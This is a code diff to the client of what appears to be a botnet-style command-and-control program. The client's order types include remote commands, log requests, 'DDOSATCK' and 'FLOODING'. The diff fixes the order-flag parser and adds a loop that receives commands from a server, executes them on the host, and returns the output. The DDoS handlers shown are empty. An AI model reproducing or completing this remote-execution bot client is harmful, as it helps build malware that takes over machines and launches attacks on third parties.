@@ -6,23 +6,20 @@
 #include "../../include/client/client_utils.h"
 #include "../../include/logging.h"
 #include "../../include/send_message.h"
+#include "../../include/receive_message.h"
+#include "../../include/commands.h"
 
 // Check the 8 first characters of the buffer to check the order type
-enum OrderType get_order_enum_type(char *buffer){
+enum OrderType get_order_enum_type(const char *buffer) {
     char flag[9];
-    char* initialBuffer = buffer;
-    for(int i = 1; i++; i<= sizeof(flag)-1){
-        flag[i] = buffer[i];
-        i++;
-    }
-    flag[9] = '\0';
-    buffer = initialBuffer;
+    strncpy(flag, buffer, 8); // Copy the first 8 characters
+    flag[8] = '\0'; // Null-terminate the string
 
-    if (strcmp(buffer, "COMMAND_") == 0) return COMMAND_;
-    if (strcmp(buffer, "ASKLOGS_") == 0) return ASKLOGS_;
-    if (strcmp(buffer, "ASKSTATE") == 0) return ASKSTATE;
-    if (strcmp(buffer, "DDOSATCK") == 0) return DDOSATCK;
-    if (strcmp(buffer, "FLOODING") == 0) return FLOODING;
+    if (strcmp(flag, "COMMAND_") == 0) return COMMAND_;
+    if (strcmp(flag, "ASKLOGS_") == 0) return ASKLOGS_;
+    if (strcmp(flag, "ASKSTATE") == 0) return ASKSTATE;
+    if (strcmp(flag, "DDOSATCK") == 0) return DDOSATCK;
+    if (strcmp(flag, "FLOODING") == 0) return FLOODING;
     return UNKNOWN;
 }
 
@@ -73,27 +70,44 @@ char* read_client_log_file(int n_last_line) {
     return buffer;
 }
 
-void execute_order_from_server(int sockfd, enum OrderType order_type, char* buffer){
-    switch (order_type) {
-        case COMMAND_:
-            /*
-                Command *cmd = ...
-                int result = execute_command(cmd);
-                free_command(cmd);
-            */
-            break;
-        case ASKLOGS_:
-            char *buffer = read_client_log_file(3);
-            send_message(sockfd, buffer);
-            free(buffer);
-            break;
-        case ASKSTATE:
-            break;
-        case DDOSATCK:
-            break;
-        case FLOODING:
-            break;
-        default:
-            break;
+int parse_and_execute_command(const char *raw_message, int sockfd) {
+    Command cmd;
+    deserialize_command((char *)raw_message, &cmd);
+
+    // Execute command
+    char result_buffer[4096] = {0};
+    int exit_code = execute_command(&cmd, result_buffer, sizeof(result_buffer));
+
+    // Send the result back to the server
+    if (exit_code >= 0) {
+        send_message(sockfd, result_buffer);
+    } else {
+        send_message(sockfd, "Command execution failed");
     }
+
+    // Cleanup
+    if (cmd.program) free(cmd.program);
+    if (cmd.params) {
+        for (size_t i = 0; cmd.params[i]; ++i) {
+            free(cmd.params[i]);
+        }
+        free(cmd.params);
+    }
+
+    return exit_code;
+}
+
+void receive_and_process_message(int sockfd) {
+    char buffer[1024];
+
+    // Receive the message from the server
+    if (receive_message_client(sockfd, buffer, sizeof(buffer)) < 0) {
+        output_log("Failed to receive message from server\n", LOG_ERROR, LOG_TO_ALL);
+        return;
+    }
+
+    output_log("Done receiving, preparing to parse and execute\n", LOG_DEBUG, LOG_TO_CONSOLE);
+
+    // Parse and execute the command
+    parse_and_execute_command(buffer, sockfd);
 }
